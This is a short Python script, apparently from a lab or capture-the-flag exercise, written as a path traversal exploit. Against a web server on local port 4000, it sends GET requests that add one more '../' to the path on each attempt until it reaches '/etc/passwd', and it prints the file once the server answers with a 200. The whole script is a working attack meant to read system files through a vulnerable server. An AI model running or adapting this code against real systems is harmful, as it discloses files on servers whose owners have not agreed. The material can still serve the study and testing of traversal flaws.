#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (c) 2020 Xvezda <xvezda@naver.com>
#
# Use of this source code is governed by an MIT-style
# license that can be found in the LICENSE file or at
# https://opensource.org/licenses/MIT.


from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals


import re
import time
import socket
from contextlib import closing


def exploit():
    for i in range(1, 0x10):
        print('[+]', 'Connect to server')
        time.sleep(1)  # Explicitly wait 1 seconds

        with closing(socket.create_connection(('0', 4000))) as conn:
            print('[+]', 'Server connected')

            print('[+]', 'Attempt %d' % (i,))
            payload = ('.'*2 + '/') * i
            payload += 'etc/passwd'
            conn.send('GET /%s HTTP/1.0\n\n' % (payload,))
            res = ''
            while True:
                buf = conn.recv(1024)
                if not buf:
                    break
                res += buf
        stat = re.search(r'^HTTP/\d\.\d (\d{3}) (.+)$', res, re.M)
        if not stat:
            continue
        code = stat.group(1)
        if code != '200':
            continue
        print('[*]', 'Result:')
        print(res)
        break
    else:
        print('[x]', 'Exploit failed')


def main():
    exploit()


if __name__ == '__main__':
    main()

